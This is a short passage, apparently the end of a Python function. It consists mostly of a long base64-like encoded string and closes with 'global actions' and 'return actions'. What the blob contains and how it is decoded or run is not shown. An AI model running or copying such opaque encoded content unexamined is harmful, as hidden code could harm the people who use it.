FCOPu6+kp4XmgIMFgOcjKOoJ+3JZ0oCbLqe5UD8l3Z/yb+ddvGOWG0OADjzaF9AAxxocolabgjlXk9Qa92zgUtq6C7RBGdxrsC7Qz0oS675hGXNadWFvsf9Vlp8YD75ytpZ8iYG6+muPDT5uhkkfqf//BMnSQnIxSQd8dRhIBR3jAvdsew+tU0PPGFNgvmucX1VVeYNyW1tX5LgXDn4SCHSnLwyxgtUyk5vB7+FGFOoFRokxTSt0kxYAGTMIiqHJmaKE3nGc2iBkLbAMcgQvCRfSLrYZ9GQCMH3+geCTVCZol0PCwybslAgnYxy5+Yimah0e62Uj/U+laY7opxlEApjojboCXVocfBW1se9ZJ8YIgndi6RcF9k79jb9gkn0CBAFAAD3I43/M7f/9797//N377++quqFIyO+5bHcn2ByuWjuHibB4gZn9TRQgApWU7lNwJe'))

    global actions
    return actions
